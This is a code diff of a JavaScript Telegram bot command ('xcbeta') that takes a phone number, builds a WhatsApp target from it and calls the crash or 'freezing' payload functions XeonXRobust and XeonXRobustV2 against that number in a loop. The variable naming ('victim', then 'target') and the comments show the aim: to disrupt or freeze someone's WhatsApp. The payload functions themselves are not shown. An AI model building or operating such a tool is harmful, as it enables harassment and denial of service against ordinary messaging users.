@@ -3,9 +3,6 @@ const { generateMessageIDV2, WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessag
 const fs = require('fs'); 
 const pino = require('pino');
 const axios = require("axios");
-const from = m.key.remoteJid
-var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
-
 
 async function getBuffer(url) {
 
@@ -604,12 +601,15 @@ bot.command("xcbeta", checkWhatsAppConnection, async ctx => {
     return ctx.reply(`Example: commandnya 62×××`);
   }
 
-victim = text.split("|")[0]
-Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
 
+  // Proses response pertama
+  await prosesrespone(target, ctx);
+
+  // Melakukan proses freezing 50 kali
 for (let i = 0; i < 10; i++) {
-	await XeonXRobust(Xreturn, cella, (cct = true), (ptcp = true));
-        await XeonXRobustV2(Xreturn)
+	await XeonXRobust(target, cella, (cct = true), (ptcp = true));
+    await XeonXRobustV2(target)
 }
   // Menyelesaikan proses response
   await donerespone(target, ctx);
